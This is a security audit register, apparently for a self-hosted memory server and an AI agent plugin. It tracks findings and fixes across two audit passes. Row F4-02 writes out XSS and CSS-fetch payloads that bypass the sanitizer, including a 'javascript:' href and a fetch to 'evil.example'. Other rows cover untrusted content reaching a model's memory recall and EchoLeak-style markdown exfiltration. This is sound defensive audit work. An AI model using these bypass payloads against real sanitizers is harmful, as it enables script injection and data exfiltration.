| W9-02 | `memory_get` tool-name **collision** between the brain extension (`plugin/src/tools.ts:449`) and memory-core in the same openclaw host — registration-order shadowing (OWASP confused-deputy family; the 2026-07-28 MCP spec still provides no tool-definition integrity) | MED | **CLOSED — fork lane (zero-conflict by construction).** All eleven brain tools namespaced `brain_*` (`brain_memory_recall`/`_store`/`_verify`/`_get`/`_graph_entity`/`_graph_traverse`/`_proposal_list`/`_proposal_decide`/`_procedure_get`/`_procedure_store`, `brain_decision_evaluate`) — extension-owned code only (plugin 0.6.12, synced to the fork, byte-parity), so upstream's `memory-core` keeps its names and the collision dissolves; no upstream file touched. Also fixed the two stale manifest descriptions still claiming "the tool path always labels" (the two-path truth landed with the exclude fix). Fork lane measured: **151/151 vitest + tsc clean** |
| K9-02 | Typebox five-surface drift; committed fork lockfile internally inconsistent (manifest 1.3.27 / importer 1.3.30 / catalog 1.3.33-only) — `--frozen-lockfile` fails at HEAD; the uncommitted edit repairs one split and leaves manifest≠lock | MED | **CLOSED — fork lane, measured 2026-10-06.** All five surfaces now read **1.3.33**: canonical `plugin/package.json`, the fork extension manifest, the fork lockfile (specifier + resolution), the `pnpm-workspace.yaml` catalog, and the installed `node_modules/typebox` — and the audit's own failing symptom is gone: `pnpm install --frozen-lockfile` exits 0 on the fork. Landed across the operator's alignment commits (canonical pin → 1.3.33, fork lockfile re-locked) plus the scripted re-sync; the sync's typebox fork-field patch is RETIRED — the last sync ran with zero declared deltas and byte-parity both directions |
| K9-03 | `link-reader-content.ts` `<img>` pipeline never consults `remoteImageHosts` — the last ungated auto-fetch surface (K8-02 elevated: every other surface is now gated) | MED | **OPEN — fork lane** |
| S9-03 | signal-gateway `config.yaml` (carries `auth_token`) is the **only secret file without the 0600 law** (`config/mod.rs:108-117` reads without a permission check; bridge/relay/store all enforce) | LOW-MED | **CLOSED — R80.** `Config::load` refuses group/world bits (mode & 0o077) before reading — mirrors the server's `secret_file` law; the refusal names chmod 600. Pins `a_world_readable_config_is_refused_not_read` + the `a_private_config_loads` anti-vacuity arm (config/mod.rs tests) |
| T9-02 | `docs/security.md:10-11` claims the server **refuses** to bind `0.0.0.0` without `BIND_PUBLIC=1` — drill-proven FALSE: warn-and-bind (`bootstrap.rs:1124-1131`), `/ready` 200 on the LAN interface; `docs/configuration.md:9` states the true behavior (the tree's two docs disagree) | FALSE claim | **CLOSED — R77.** docs/security.md now states the drill-measured truth (warn-and-bind on 0.0.0.0; refusal only for unparseable hosts / tokenless non-loopback) and agrees with docs/configuration.md; the T9-02 correction named in-line |
| T9-01 | The execution charter's own §1 baseline was 8+ releases stale (pinned v1.28.82/2026-09-12; measured R76/2026-10-05) and its requested deliverable filename collides with the existing FOURTH_PASS report | LOW | **CLOSED — this audit** (re-measured baseline; deliverable renamed NINTH_PASS) |
| T9-03 | SECURITY.md's own stamp policy ("moves in the same commit as any security-relevant claim") violated by R76: two security controls shipped with SECURITY.md still 2026-09-25 and THREAT_MODEL still "through v1.28.92" | LOW | **CLOSED — R77.** SECURITY.md `Last reviewed` → 2026-10-06 (R77) and THREAT_MODEL `Coverage current through` → R77, with §5b rows BACKFILLED for R76's two controls (alert-sink freshness + outermost rate limit), each row naming its own backfill; the same-commit stamp law is honored by the commit that carries them |
| T9-04 | Register citation drift: S8-04 row cites `main.rs:129` for the wrap; actual `tools/signal-gateway/src/main.rs:143` | LOW | **CLOSED — R77.** S8-04 row's citation corrected `main.rs:129` → `main.rs:143`, with the correction named in the row |
| F9-S-01 | `/legal-holds?reason=` builds `LIKE '%needle%'` with no `ESCAPE` (`src/legal_hold.rs:231,243`): `?reason=%` matches everything, two full-table scans per request; the house fence `like_contains_pattern` exists unused here | LOW | **CLOSED — R77.** `list_holds` rides the house fence: `like_contains_pattern` + `ESCAPE '\\'` — `?reason=%` matches only literal-percent rows. Two pins in `src/legal_hold.rs` (metacharacters + substring anti-vacuity), red-proofed by reverting the fix only (both failed; a wrong case-sensitivity assertion in the pin's own first draft was caught by the same run — SQLite LIKE is ASCII-case-insensitive, fence or no fence) |
| F9-S-02 | `pinned_hostcall_client` (`src/workflow/hostcalls.rs:189-230`) is not single-flight — concurrent first calls each resolve DNS and diverge from the pin map; the path also applies no IANA table (disclosed posture: the operator allowlist is the anchor) | LOW | **CLOSED.** The miss path is single-flight: one guard held across check-resolve-insert, so the first resolution wins for every concurrent caller and every served client is a client the map recorded. Red-proof completed (the round's interrupted half): reverting to the check-then-resolve shape fails `pinned_hostcall_client_is_single_flight` with `left: 4, right: 1` — four concurrent first calls, four resolutions — deterministically, via a 150 ms counting resolver that holds all four callers in the miss simultaneously. The no-IANA-table posture stays DISCLOSED, unchanged: the operator allowlist is the anchor, by design. |
| F9-S-03 | The egress send seam (`src/webhook.rs:692-702`) has the same double-resolution shape — both resolutions pass `validate_public_addrs`, so the only consequence is pin divergence | INFO | **CLOSED.** Same single-flight fix at the egress seam: `egress_client_for_url_with` holds the pin-map write lock across check-resolve-insert and builds the shared client AFTER the winning insert, pinned by `egress_client_for_url_is_single_flight`. The resolver seam is split out so the pin counts resolutions without touching the network. |
| F9-S-04 | Workload-identity census: every inter-component seam is a static long-lived shared secret; only HTTP session JWTs are bounded (24 h). Corroborates F9-01 + W9-03 | INFO | **CLOSED — R77.** THREAT_MODEL §5b ceilings carry the workload-identity census row: every inter-component seam is a static shared secret, only session JWTs bounded (24 h); the per-boot ephemeral bearer was considered and DECLINED with reasons (breaks scripted consumers at each restart; needs a provisioning story), so rotation + F9-01's loud refusal are the named posture |
| S9-04 | signal-gateway `BrainClient` follows redirects (`brain.rs:169-174`); the signed webhook headers re-send cross-origin — channel-bridge codified `Policy::none()` as law, the twin diverges | LOW | **CLOSED — R80.** `BrainClient::new` builds with `redirect::Policy::none()` — the channel-bridge egress law mirrored, with the law comment. Pin `brain_client_refuses_redirects` (tests/s9_02_cache_wiring.rs) |
| S9-05 | valet-relay inbound dedup key uses time-of-forward (`relay.js:218`), so a retained envelope re-polled in a later second gets a fresh id and re-posts; the Rust twin derives from the message's own timestamp (`brain.rs:157-159`) | LOW | **CLOSED — R80.** `inboundDedupId(env, text, from)` derives from the ENVELOPE'S platform timestamp (the Rust twin's `external_id` law); absent-timestamp falls back to forward time; `webhook-timestamp` stays wall-clock (freshness ≠ identity). Pin `a_retained_envelope_keeps_its_dedup_id_across_re-polls` (regex anchors the envelope ts — a wall-clock id cannot match) |
| S9-08 | Mode posture: main `brain.db`, the pre-migration `VACUUM INTO` backup (`bootstrap.rs:604`) and marker are **0644** while the snapshot/standby/temps families are 0600/0700 (drill-measured; no THREAT_MODEL row is false — the 0600 claims are family-scoped) | LOW | **CLOSED — R80.** `enforce_private_mode` (bootstrap) brings the main db, the pre-migration `VACUUM INTO` backup and the marker into the 0600 family — idempotent (heals pre-law artefacts, warns the heal), warn-and-continue on failure (mode is defence-in-depth, matching the backup block's posture). Pin `private_mode_is_enforced_and_idempotent` (bootstrap tests) |
| W9-01 | OTLP span attributes are the one outbound lane without the markdown-ref strip (`src/otel.rs:23-25`) — EchoLeak-class parity residue; no in-tree collector dereferences | LOW | **CLOSED — R78.** `sanitize_span_attribute` gains the markdown-ref strip, ordered BEFORE the newline collapse (reference definitions are line-anchored — collapsing first would disarm exactly that form; the pin's first run caught this). Pin `span_attributes_strip_markdown_refs` (image ref, reference-style definition, bare-URL anti-vacuity), red-proofed by reverting the strip |
| W9-04 | `untrustedOrigins:"exclude"` filters **auto-inject only** — the `memory_recall` tool always returns tainted hits, labeled (`plugin/src/format.ts:119-125`); the knob's security meaning is narrower than its name | LOW | **CLOSED — R81.** `untrustedOrigins:"exclude"` now drops channel-captured hits from the `memory_recall` TOOL result too (a tool result is model context exactly like the injected fence); all-captured results return the no-memories shape with `excludedByPosture`. Default "label" byte-identical. The three stale "tool path never excludes / always labels" comments (format.ts ×2, config.ts) are rewritten to the two-path truth. Pins in `plugin/test/plugin.test.ts`: exclude drops captured on the tool path, all-captured → no-memories, label default keeps + labels (anti-vacuity) |
| W9-05 | Rule-of-Two tension in the openclaw host (plugin parses untrusted JSON in the process holding provider keys) is real, mitigated, and **undocumented as such** | LOW | **CLOSED — R77.** Rule-of-Two ceiling recorded in THREAT_MODEL §5b: the plugin parses untrusted JSON in the host process holding provider keys — accepted, mitigated (unforgeable fence, per-agent gating, sanitized projection), and now visible as a ceiling so a fence-weakening refactor has something to answer to |
| S9-07 | The plugin's security pins execute **nowhere in this repository**: ci.yml touches `plugin/src` only via lipstyk static scanning; `shell.yml` watches the fixture twin (`plugin/fixtures/invisible-classes.json`) but not the code twin — a `plugin/src/format.ts` edit lands on `main` with zero tests run here | INFO | **OPEN — fork lane** (R71's vitest lane owns execution; the fixture/code asymmetry is the new evidence) |
| R9-03 | The S8-04 structural pins are **text-bound** (match the literal `apply_rate_limit(app,`; an env-conditioned wrap satisfies every test while disabling production) — the presence-only-guard class | LOW | **OPEN — UNROUTED** (D8-02's gate-law register would own the red-proof column) |
| R9-04 | `reg_watch.rs:250-270` wiring check is file-granular over four Art 50 classes in one file — removing one class's seal leaves the pin green; the behavioral provenance meta-test is the actual guard | LOW | **OPEN — UNROUTED** (same D8-02 umbrella) |
| R9-05 | `CRATE_TEST_FLOOR`'s needle walks `src/`+`tests/` only — tools/, crates/, client/, shell/, plugin/ test mass invisible (documented; per-crate CI lanes mitigate) | INFO | **DISCLOSED** — documented scope, unchanged |
| R9-01 | *Filed statically as WEAKENED ("digest binds canonical, not stored bytes"), **REFUTED by the live drill**: both the markdown-ref edit and the invisible-only edit moved the digest and the stale-digest approve 409'd — the digest is stricter than the displayed view (fail-closed)* | — (refuted) | **CLOSED — REFUTED-BY-DRILL** — no fix owed; recorded in the ninth-pass report §4 as the pass's methodology result |
| L9-01 | The repo carries **two mutually exclusive pins for CETS 225 entry-into-force**: `AUDIT.md:943` says 2025-11-01; `src/reg_watch.rs:142` + `docs/compliance.md:136` pin 2025-09-01. CoE primary 403 today; unresolved | MED-LOW | **CLOSED — R77.** One date, three sites: 2025-09-01 (reg_watch's CoE-sourced constant, compliance.md, and now AUDIT.md's L7-07 row corrected with the contradiction + the if-proved-otherwise rule named). Still not primary-resolved — the correction is recorded as a correction, not as a verification |
| L9-04 | `docs/compliance.md:351-353` claims "LLM Top 10 **2026** (2026-08-04) … **LLM09** Vector/Embedding" — the canonical page still presents 2025 as latest, and in 2025 Vector/Embedding is **LLM08**; a 2026 edition exists (news 2026-09-01) with unconfirmed numbering. Date or numbering is wrong | LOW | **CLOSED — R77.** COMPLIANCE.md §6.5 + OWASP_AGENTIC_2026.md carry the L9-04 honesty note: the 2026 numbering (LLM09 Vector/Embedding) stands on the DOI'd `2026/final` artifact this repo live-fetched, NOT on a fresh page read (the canonical page still presented 2025 at the 2026-10-06 reading, where the entry is LLM08); re-verify before external citation |
| L9-05 | `docs/compliance.md:355` "Agentic Top 10 launched 2025-12-09" — the standalone list page 404s; ASI06 exists as a workstream name; formal launch unconfirmed | LOW | **CLOSED — R77.** The 2025-12-09 launch date is WITHDRAWN as unconfirmed (standalone page 404s); the wording now claims only what the ninth pass verified — the Agentic Top 10 for 2026 is released (re-verified 2026-10-06) and ASI06 is an entry. First-publication date explicitly not claimed |
| L9-03 | EOs 14409 (FR 2026-06-05) and 14434 (FR 2026-10-02) were filed "unverifiable" in `docs/US_STATE_MAP.md:21-25` — both now FR-verified; rows addable with cites | LOW | **CLOSED — R77.** The map's 2026-10-06 addendum carries the FR-verified EO 14409 (FR 2026-06-05) + EO 14434 (FR 2026-10-02) rows, the FTC TIDA/NPRM facts, and supersedes the blockquote that withheld them — status date deliberately NOT bumped |
| L9-15 | L8-11 export-controls UNKNOWN partially filled: no BIS model-weights rule found in the 2026-10-06 Federal Register sweep (chip/chokepoint rulemaking continues) — a measured fact, not a clean bill | LOW | **CLOSED — R77.** Export-controls row moved to the measured state in the addendum: no BIS model-weights rule found in the 2026 FR sweep — dated observation, watch, not a permanent fact |
| L9-16 | CT CART PA 26-15 general duties went **live 2026-10-01** on date arithmetic alone — cga.ct.gov is connection-dead, so the statute text has still never been read | LOW | **OPEN — UNROUTED** (external act; the map's 2026-10-06 addendum now carries the live-on-unread-statute state WITH the failed-fetch evidence — genuinely open until a primary is readable) |
| L9-02 | Art 111(4) provenance upgraded: reg_watch's open question answered against the consolidated text (2026-10-06; OJ text still unread) | INFO | **CLOSED — this audit** (provenance label upgrade; no code change) |
| L9-07 | sbom 1.5 ceiling **confirmed** — cargo-cyclonedx 0.5.9 (latest, 2026-03-19) still documents "1.3, 1.4 or 1.5" while the CycloneDX spec is at 1.7.2 | INFO | **CLOSED — this audit** (pin confirmed correct; no action until upstream) |
| L9-08 | NIST AI RMF revision **confirmed underway** (White House AI Action Plan; no 1.1 published) — the compliance footnote's re-check trigger is armed | INFO | **CLOSED — this audit** (footnote stands, now affirmatively armed) |
| L9-09 | MCP 2026-07-28 claim in `docs/compliance.md:335` verified verbatim — and the spec has since removed sessions and added `server/discover`; a re-map of the repo's MCP surface is advisable | INFO | **CLOSED — this audit** (claim verified; re-map noted as advisory) |
| L9-10 | CRA Art 14 clocks re-verification **blocked** (EUR-Lex bot-wall; Commission 403) — the 2026-09-14 verification stands, unrepeatable from this environment | INFO | **DISCLOSED** (blocked, not refuted; stamp stays 2026-09-14) |

**Re-verified this pass, still open, unchanged:** S8-07 (islands — corrected census:
**3** genuinely unconsumed: aftersales, care, interview; troubleshoot HAS a consumer in
steward-harness), F8-02 enforcement decline, F8-03 idempotency residual, D8-02
gate-law register, K8-01 (sharper — the substring skip also disables
`sanitizeExternalContentText`: invisible-strip AND image-strip off at once on
read/exec/transcript), K8-03 (shared by the MCP path), K8-05/06 (narrowed), K8-11
(split; node lane same-origin checksum), D8-01, L8-04/05/06/07/11.

**Drill-verified HELD (no rows owed):** read-seam neutralization (tag block, nested +
mixed-case welds, `onerror`, markdown weld, bidi — live wire diff); quarantine
list/release; digest-bound approve + replay refusal (404, no double-promote, count
2→3 once); parcels tamper → 400 `signer_mismatch`; DSAR purge reaching promoted
proposals (proposals→0) with zero db+wal residue and backup retention matching the
certificate's own caveat; suggest `untrusted:true` + `provenance.reason:anticipated`;
`/auth/refresh` 404 `jwt_unavailable` in opaque mode (posture fact).

## 2026-10-06 — Tenth-pass full-spectrum audit (F4/D4/P4/K4/L4/R4/T4)

Executed at `fecfeac0` (v1.29.3) over `docs/SECURITY_AUDIT_20261006_TENTH_PASS.md`
(untracked, as every audit report since the ninth pass). Five parallel arms —
server core, satellites/CI/supply-chain, Mode-B claims falsification, fork diff,
regulatory sweep — plus an orchestrator-owned pass: the A1 comprehension artifacts
(layer map, trust boundary, five inventories), the four-tree parity matrix rebuilt
from scratch, and **two reconciliations** where a subagent's verdict was overturned
by re-running its attack myself (§ errata in the report).

**The tenth pass's theme: not a missing control — a control whose enforcement point
was never exercised.** Nine passes closed controls; what survived is a wrapper
nothing calls, a value arm unreachable through the tokeniser's grammar, a posture
flag read by presence, and rung 3 of a three-rung ladder. Two register rows this
pass **falsifies** (K9-01, and R9-02 via B4-01) and one **re-opens a register's own
premise** (K8-01, sharpened).

**This charter repeated the ninth pass's own defect, recorded as T4-01-adjacent
truth:** T9-01 closed "the execution charter's §1 baseline was 8+ releases stale and
its deliverable filename collided with the existing FOURTH_PASS report". The tenth
charter was issued from the same template and carried the *same* stale baseline
(pinned v1.28.82 / 2026-09-12 / "you are the FOURTH pass") against a measured
v1.29.3 / 2026-10-06 / ninth-pass-closed tree, and the same colliding filename. The
fix for T9-01 was applied to one charter; the class is unclosed. The deliverable was
renamed `…_20261006_TENTH_PASS.md` and added to `.gitignore` in the same act, because
`.gitignore` lists each audit report **explicitly** — a new one is NOT covered by the
existing lines, so writing it without that edit would have shipped a private audit
report with the next release tag (the R77 privacy failure, re-armed).

| Ref | Finding | Sev | Disposition |
|---|---|---|---|
| F4-01 | **The openclaw gateway runs the OPERATOR token.** Measured by digest: the gateway env's `BRAIN_SERVER_AUTH_TOKEN` == `auth-token` **line 1** (the privileged principal), not line 2 (the agent token). The env file exports **no** `BRAIN_TOKEN`/`BRAIN_TOKEN_FILE`, so the plugin's ladder falls to `cfg.authToken` (`plugin/src/config.ts:189`), which `openclaw.json` sets to the literal `${BRAIN_SERVER_AUTH_TOKEN}` — and `openclaw/src/plugins/loader-load-context.ts:2` proves plugin config IS env-substituted at load. With `agents:["*"]` + `autoCapture:true` + **`captureMode:"direct"`** + `proposalTools:false`, every agent turn authenticates as superuser and writes land **in memory**, not as proposals. Second, independent defect in the same ladder: rungs 1 and 2 were hardened to REFUSE a multi-token value (`config.ts:170-174,181-186`) and **rung 3 has no such check** — the one rung in production is the unguarded one. Third: the env file is machine-owned (`# Generated by OpenClaw`), so the 2026-09-09 hand-fix reverts on any `gateway install --force` | **CRITICAL** | **CLOSED — R82.** Fork half (L0): the gateway wrapper pins `BRAIN_TOKEN_FILE=$HOME/.config/brain-server/auth-agent-token`, unsets `BRAIN_SERVER_AUTH_TOKEN`, and `openclaw.json` carries no `authToken`; `bash scripts/secrets-truth.sh --selfcheck` exits 0 with auth line 1 (operator) digest `70fcdd05b6b8`, line 2 (agent) `7257711ce377`, effective gateway env `token_file=7257711ce377`, `token_var`/`server_auth` absent — the gateway authenticates as the agent principal, so `/ops/agents/revoke` reaches it. Hostile fixture (the machine's pre-fix wrapper, on copies) FAILS the selfcheck naming the operator-digest match (`9932a4ef`, digest-only throughout). Plugin half (`c78f3984`): rung 3 refuses multi-token values; pin `plugin_config_token_refuses_a_multi_token_value` green in the fork's vitest runner (`1 passed \| 15 skipped`), red-proven by stripping the refusal (`expected [Function] to throw an error`). The live revoke/kill-switch drill was NOT run — the evidence is digest truth; all drills on copies |
| F4-02 | **The read seam's attribute tier is bypassed with one space around `=`.** `src/gate.rs:670` breaks attribute tokens on whitespace only, so `href = "javascript:…"` tokenises as `["href","=","\"javascript:…\""]` and `attr_is_hostile("href")` is called with `value = None`, so `gate.rs:711`'s `&& let Some(v)` never fires. Measured against the real `sanitize_read`: control `<a href="javascript:alert(1)">` → `<a >`; **all five whitespace forms survive byte-identical**, as do `formaction =` and `style = "background:url(https://evil.example/a.png)"`. **This falsifies R9-02's `CLOSED — R78`** (`AUDIT.md:1091`): the `css_value_fetches` arm is unreachable through the tokeniser's own grammar. Honest severity: not a live in-tree sink (`{@html}` count 0; `kb.rs:158-173` escapes every fragment) — the *"one downstream-renderer edit from live"* class — but universal across all seven scheme attributes and every stored-content surface, where R9-02's `style`/`ping` needed two specific names. `cargo test --lib gate::` = **61 passed / 0 failed with the bypass live**; no pin anywhere has whitespace around `=` | **HIGH** | **OPEN — UNROUTED.** Fix: pair a bare `=` token with the following token as its value (one lookahead, ~6 lines), preserving the byte-identical passthrough law for clean tags. Pin: extend the canary family with 5 spacings × all 7 scheme attributes + `style`, anti-vacuity arm = the tight form still dies |
| F4-03 | A JWT deployment that loses its key dir serves an **unauthenticated superuser API**: `jwks.rs:137-142` returns `Ok(default)` (zero keys, not even the `warn!` branch) → `from_env(0)` → `AuthMode::Opaque` → `TokenRead::NotConfigured` → `authorize(&None)` = superuser. `enforce_loopback_bind_guard` passes (it keys on `is_jwt()` \|\| tokens-non-empty, both false after the downgrade). Reachable with an existing-but-empty dir; `AuthMode::from_env` has one non-test caller and **zero** coverage of the arm | **HIGH** | **OPEN — UNROUTED.** Fix: refuse boot when an issuer is configured and 0 keys load (the `validate_write_posture` shape, `config.rs:478-484`). Pin `jwt_issuer_configured_with_zero_keys_refuses_boot` + two anti-vacuity arms (a populated key set still resolves JWT; no issuer is still not a refusal). Floor +3 |
| F4-04 | `/ingest/memory` commits its business write then writes the audit evidence **on a second connection** (`memory.rs:1312-1324`); a crash or a busy-timeout in the evidence write's own `BEGIN IMMEDIATE` leaves a durable memory with **no chain row** and `verify_chain` still passing. Invisible by construction — `audit::record` returns a non-`#[must_use]` `Option`. Its sibling in the same file does it right and says so (`:688-706`) | MED-HIGH | **OPEN — UNROUTED.** Fix: move the call inside `tx` before `commit()` (4 lines). Pin `tests/audit_per_write_wiring.rs` — `audit::record(&tx,…)`'s byte offset precedes the enclosing `commit()`, plus a behavioural arm asserting the chain grows |
| F4-05 | The domain lifecycle writes durable, memory-bearing state with **no audit row at all**: `rg 'audit::' src/handlers/domains.rs` → **0 hits** in 615 LOC. `POST /domains/{name}/import` renames an uploaded file over `brain-<domain>.db` — an entire corpus replaced with no hash-chained evidence — while its sibling `DELETE` does write one (`service/domains_admin.rs:433-439`). `release_quarantine` and the verified-webhook accept share F4-04's post-commit shape | MED | **OPEN — UNROUTED.** Fix: one `audit::record` per site on the existing `AuditKind::Reconcile`; wrap `release_quarantine` in the shared `WorkflowTx`. Pins `domain_create_and_import_each_write_an_audit_row`, `release_quarantine_records_its_evidence_inside_the_same_transaction`, anti-vacuity `a_refused_import_writes_no_row`. Floor +3 |
| F4-06 | Every per-domain SQLite file is created **world-readable (0644)**: `enforce_private_mode` has exactly **three** production call sites (main DB, pre-migration backup, marker) and is called from neither `domain_registry.rs:250-285` nor `handlers/domains.rs:479-490` (which `write`s + `rename`s the file before any SQLite code runs). Measured `0o644` on both, under a `0755` default root; `registry.db` too. Disclosure, not tamper (the chain's scope is SQL-level) | MED | **OPEN — UNROUTED.** Fix: make the helper `pub(crate)` and call it at those two sites (no re-implementation). Pin `a_domain_db_created_by_the_registry_is_owner_only` — **red today** — + anti-vacuity idempotence/heal arm. Floor +3 |
| F4-07 | `POST /workflow/plugins/mount`'s tokenless bridge arm verifies the HMAC but checks **no timestamp freshness and claims no replay id** (`channel_webhook.rs:1158-1199` reads `webhook-timestamp` and never uses it; no `timestamp_skew_ok`, no `seen_claim`), while the channel-webhook receiver 1 000 lines above has **both**. A captured signed envelope replays forever, each replay a serialized `BEGIN IMMEDIATE` append plus a head-pin churn | MED | **OPEN — UNROUTED.** Fix: reuse the two existing helpers (~6 lines). Pins `bridge_mount_arm_refuses_a_stale_signed_timestamp` + `bridge_mount_arm_refuses_a_replayed_webhook_id` (assert the **row count, not the status** — the R2 lesson). Floor +3 |
| F4-08 | `no_sql_in_handlers_enforced` roots at `src/handlers` alone (anti-vacuity arm `files.len() >= 30` satisfied by that tree). A per-function census of `src/server/router/memory.rs` production regions with the guard's **own** token list: **59 rusqlite call shapes across 15 HTTP handlers** (`ingest_markdown` 26, `traverse_graph` 10, …), incl. its own `DELETE FROM relationships` sweep and legal-hold preflight. Probed the obvious neuter: a `#[cfg(test)] mod` **cannot** exempt production code, so the guard is sound **inside** its scope — the scope is the defect | MED | **OPEN — UNROUTED.** Sequence honestly: land the widened walk as a **failing** pin with the 59 sites committed, migrate in the Cornerstone order, add a down-only `ROUTER_SQL_SITES_FLOOR`. Do **not** widen-and-ship-red, and do not widen without a floor |
| F4-09 | `GET /graph/relationships/{id}/history` returns an **unbounded** version list (`memory.rs:3103-3112`, no `LIMIT`), expanded to 9 JSON fields each — while every sibling list surface in the same file is capped **and names its constant** (`:2644`, `ump_ops.rs:931`, `core.rs:431`). `openapi.yaml:581-603` documents "every version", so the fix moves the wire prose | LOW-MED | **OPEN — UNROUTED.** Named `const EDGE_HISTORY_MAX: usize = 500;` + a disclosed `truncated: true`. Pin asserts BOTH the cap and the disclosure (a silent clamp is its own defect) |
| F4-10 | `BIND_PUBLIC` is read with `std::env::var(..).is_ok()` (`bootstrap.rs:1161`) — **presence-only**, so all four tier profiles shipping `BIND_PUBLIC=0` **arm** the public opt-in: the `0.0.0.0` warning is suppressed, and an unparseable `BIND_HOST` takes the `0.0.0.0` fallback instead of the `exit 2` refusal while logging "BIND_PUBLIC is set". `grep -rn BIND_PUBLIC tests/` → **empty**. `docker-compose.yml:26` uses `"1"`, so the compose and tier authors disagree about the same knob | MED | **CLOSED — R82.** `BIND_PUBLIC` is value-read — `matches!(std::env::var("BIND_PUBLIC").as_deref(), Ok("1") \| Ok("true"))` (`9501bcf4`); `cargo test --lib bootstrap` 9/0 including `bind_public_zero_does_not_opt_in_to_public_exposure` and the wiring pin `the_production_bind_public_read_is_value_read`; reverting the call site to `is_ok()` fails the wiring pin (8/1), and a presence-semantics predicate fails the `=0` arm (`left: true, right: false`); fail-closed arms (`""`, `yes`, `on`, junk, unset) green; `docker-compose.yml`'s `"1"` unchanged, the four tier profiles' `=0` now behaves byte-equal to unset |
| F4-11 | The plugin↔fork parity **baseline is gitignored** (`.gitignore:131`; absent from HEAD), so in every fresh checkout `sync-plugin.sh:75-79` prints "initializing without drift guard" and then `rsync --delete` **overwrites target-side committed edits with no complaint** — while the script header claims "Both enforced, both fail-closed". Fail-closed on exactly one machine | MED | **CLOSED — R82.** Baseline tracked (`a343f8c3`), the `.gitignore` rule deleted, `git check-ignore .plugin-sync-baseline` empty; `cargo test --test plugin_sync_baseline_pins` 2/0; mutants: untrack → `left: "", right: ".plugin-sync-baseline"`; re-adding the ignore rule fails via `--no-index` (the arm's own mutant drill exposed plain `git check-ignore` deferring to the index — fixed `3fd231ed`); a baseline naming an unresolvable commit refuses (`deadbeef` mutant). Scratch-clone drill: baseline absent → `initializing without drift guard` + a planted committed target-side edit silently destroyed by `rsync --delete` (exit 0); baseline tracked → the guard refuses target-side drift (exit 1) and a clean sync completes with fork-field patch + manifest==lock verification |
| F4-12 | `AUTH_TOKEN_FILE`'s documented `0600` is enforced **nowhere on the server read path** (`config.rs:1177` documents it; `:1186-1197` `read_to_string`s with no `stat`). `check_secret_file_mode` exists but only in `src/bin/brain.rs:3927` (passphrase/rotation). The same law IS enforced in a satellite (`tools/valet-relay/relay.js:51-52`). Live host is compliant — a **missing control**, not a live exposure | MED | **OPEN — UNROUTED.** Fix: move the ~30-line helper into `config.rs`, call from `auth_token()`. Pins `a_world_readable_auth_token_file_is_refused_not_read` + anti-vacuity `a_private_token_file_loads` |
| F4-13 | No release-artifact integrity control: `install-service.sh`'s `verify_signature` is only ever handed a locally-built binary, the latest public release ships **no `.minisig` / no `SHA256SUMS`** (macOS gets ad-hoc `codesign -s -`), and `install_bin` then strips `com.apple.quarantine` **unconditionally** — justified by an operator flow ("installs a downloaded release artifact") that **no script in the tree performs** | MED | **OPEN — UNROUTED.** One CI step (`sha256sum dist/* > dist/SHA256SUMS`) + a `--verify` arm. Pin `every_published_release_carries_a_checksum_manifest` |
| F4-14 | The release gate watches **`ci.yml` only** (`release.sh:17,104-106,139`; `release.yml:275` filters `.path == ".github/workflows/ci.yml"`). `shell.yml`/`codeql.yml`/`fuzz.yml`/`docs.yml` sit outside it, and `branches/main/protection` returned **404 "Branch not protected"** (private → 403, Pro required) — **no required checks to compensate**. Re-verified at `fecfeac0`: the commit hardened the signal-gateway lane, not the gate. The `release.sh:87` claim "the ONLY automated gate between pushed and shipped" is true of `ci.yml`, false of the tree | MED | **OPEN — UNROUTED.** Iterate the publishing workflows, require every one to conclude `success`. Pin `the_release_gate_covers_every_publication_workflow` |
| F4-15 | The six WCAG 2.2 AA gates read `client/src/main.rs` + `client/styles/input.css`, but **no release artifact contains `client/`** and `shell/tests/` has no a11y gate — while `docs/trust/wcag22-aa-checklist.md:29,42` cites those test names as evidence for "the **shell**". Conformance verdicts rest on the wrong artifact | MED | **OPEN — UNROUTED.** Port the three mechanical gates to `shell/tests/`; retarget the checklist's evidence tags. Pin `every_wcag_gate_subject_is_a_shipped_surface` |
| F4-16 | `shell.yml:82` (`Svelte check (strict)`) runs **before** vitest, the byte-stable-client gate, the CSP assertion, `pnpm audit`, `cargo audit --file src-tauri/Cargo.lock`, Tauri clippy and the E2E, with no `if: always()` — one typing error skipped **13 steps** on the last real run, including every supply-chain gate | MED | **OPEN — UNROUTED.** Reorder (one change, no split). Pin `shell_supply_chain_gates_precede_the_typecheck_gate` |
| F4-17 | `check-doc-links.py` is invoked by **no lane** and self-vacuums from any cwd but the root (`DOCS = pathlib.Path("docs")`; from `shell/` it prints `checked 0 / all resolve`, **exit 0**) — a green gate on zero work, cited as a passing gate by AGENTS.md | MED | **OPEN — UNROUTED.** Anchor on `__file__`-relative root; add to the `docs` job. Pin asserts a non-zero, root-equal count from a foreign cwd |
| F4-18 | Five of thirteen `crates/` members are unconsumed islands with no pin tracking the set: `brain-interview-core`, `brain-care-core`, `brain-aftersales-core`, `brain-fuzz`, `gold-sets` (5/1/3/4/36 tests) | LOW | **OPEN — UNROUTED** (refines S8-07's "3"; two were wired since). Fix: `crates_consumed_set_is_pinned` with a per-entry reason |
| F4-19 | Mutable image tags on the trust chain — `quay.io/oauth2-proxy/oauth2-proxy:latest` (receives the IdP client secret + cookie secret), `rust:1-bookworm` (a **floating compiler** for the shipped binary), `debian:bookworm-slim`. No `--digest` anywhere, while every other third-party input is pinned (Actions to SHAs, pnpm, Rust, cargo-audit, HF commit) | LOW-MED | **OPEN — UNROUTED.** Digest-pin three values + a Dependabot `docker` ecosystem. Pin `every_container_base_is_digest_pinned` |
| F4-20 | `workflow_dispatch` + a free-text `version` input validated **only** against `CHANGELOG.md` can mint a release whose notes belong to another commit (the tag is created by the release action; `github.sha` is the *dispatch* ref) | LOW | **OPEN — UNROUTED.** On dispatch, require the input to be empty or equal to `${GITHUB_REF_NAME#v}` |
| F4-21 | The audit-ignore list's "re-check triggers" are prose no gate evaluates (`.cargo/audit.toml:63-74`; CI passes no `--deny warnings`/`--stale`), so a fixed-but-still-ignored advisory stays suppressed indefinitely — and dependabot PR #67 (tauri 2.11.6→2.12.1) is open now, the exact dependency the glib ignore awaits | LOW | **OPEN — UNROUTED.** Pin `no_ignored_advisory_is_fixed_in_the_current_lock` |
| F4-22 | CodeQL covers **Rust only** while `plugin/src/{format,procedural,team-bridge}.ts` (the code that parses model output) and `shell/` get no SAST — **undisclosed** rather than falsely claimed | LOW | **OPEN — UNROUTED.** Add the language with `paths: [plugin, shell]` |
